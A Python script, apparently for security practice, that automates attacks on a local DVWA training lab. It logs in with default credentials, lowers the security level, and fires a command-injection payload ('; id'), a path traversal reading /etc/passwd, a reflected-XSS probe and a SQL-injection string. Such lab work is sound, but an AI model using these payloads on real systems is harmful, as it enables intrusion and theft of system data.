#!/usr/bin/env python3
import requests
import re

# DVWA配置
DVWA_URL = "http://192.168.127.128/DVWA"
session = requests.Session()

print("=== DVWA自动测试 ===")
print("")

# 1. 访问登录页获取token
print("[1] 访问登录页...")
login_page = session.get(f"{DVWA_URL}/login.php")
token_match = re.search(r"user_token.*value='([^']*)'", login_page.text)
if token_match:
    user_token = token_match.group(1)
    print(f"    Token: {user_token}")
else:
    print("    ⚠️ 未找到token")
    user_token = ""

# 2. 登录
print("[2] 提交登录...")
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": user_token
}
response = session.post(f"{DVWA_URL}/login.php", data=login_data, allow_redirects=True)
if "Welcome" in response.text or "security.php" in response.url:
    print("    ✅ 登录成功")
else:
    print(f"    状态: {response.status_code}, 长度: {len(response.text)}")

# 3. 设置安全级别
print("[3] 设置安全级别...")
session.post(f"{DVWA_URL}/security.php", data={
    "security": "low",
    "seclev_submit": "Submit"
})
print("    ✅ 已设为low")
print("")

# 4. 开始测试
print("--- 测试1：命令注入 ---")
exec_response = session.post(f"{DVWA_URL}/vulnerabilities/exec/", data={
    "ip": "127.0.0.1; id",
    "Submit": "Submit"
})
id_match = re.search(r"uid=[^<]*", exec_response.text)
if id_match:
    print("✅ 成功：")
    print(id_match.group())

print("")
print("--- 测试2：文件包含 ---")
fi_response = session.get(f"{DVWA_URL}/vulnerabilities/fi/?page=../../../../etc/passwd")
passwd_lines = [l for l in fi_response.text.splitlines() if ":" in l and not l.strip().startswith("<")]
for line in passwd_lines[:5]:
    print(line)

print("")
print("--- 测试3：XSS反射 ---")
xss_response = session.get(f"{DVWA_URL}/vulnerabilities/xss_r/?name=test_123")
if "test_123" in xss_response.text:
    print("✅ XSS输入点存在")

print("")
print("--- 测试4：SQL注入 ---")
sql_response = session.get(f"{DVWA_URL}/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit")
if "First name" in sql_response.text or "Surname" in sql_response.text:
    print("✅ SQL注入成功")

print("")
print("=== 完成 ===")